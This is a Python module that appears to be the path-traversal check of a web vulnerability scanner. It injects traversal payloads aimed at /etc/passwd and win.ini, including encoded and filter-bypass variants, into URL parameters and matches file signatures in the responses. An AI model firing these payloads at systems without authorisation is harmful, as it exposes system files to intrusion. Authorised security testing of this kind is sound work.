from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import get_logger

log = get_logger("path_traversal")

PAYLOADS = [
    ("../../../../etc/passwd", "root:x:0:0"),
    ("../../../../../../../../etc/passwd", "root:x:0:0"),
    ("..\\..\\..\\..\\windows\\win.ini", "[extensions]"),
    ("/etc/passwd", "root:x:0:0"),
    ("....//....//....//etc/passwd", "root:x:0:0"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:0:0"),
]

PARAM_NAMES = ("file", "path", "page", "include", "template", "view", "load", "read", "download", "doc", "filename", "dir")


def _inject(url, param, value):
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def _check_signature(resp, sig):
    if not resp:
        return False
    if sig in resp.text:
        return True
    return False


def run(client, config):
    target = config.get("target", "")
    if not target:
        return {"error": "No target"}
    log.info("Path Traversal check on " + target)
    result = {"target": target, "url": target, "tested": 0, "vulnerable": []}
    parsed = urlparse(target)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    params = list(qs.keys())
    if not params:
        params = ["file", "path", "page", "include"]
    found = False
    for param in params:
        for payload, signature in PAYLOADS:
            result["tested"] += 1
            test_url = _inject(target, param, payload)
            resp = client.scan_request(test_url)
            if _check_signature(resp, signature):
                log.warning("  PATH TRAVERSAL in " + param + " (sig: " + signature + ")")
                result["vulnerable"].append({
                    "url": target,
                    "original_url": target,
                    "injected_url": test_url,
                    "test_url": test_url,
                    "param": param,
                    "payload": payload,
                    "signature": signature,
                    "severity": "high",
                })
                found = True
                break
        if found:
            break
    if not result["vulnerable"]:
        log.info("  No path traversal found (" + str(result["tested"]) + " payloads tested)")
    return result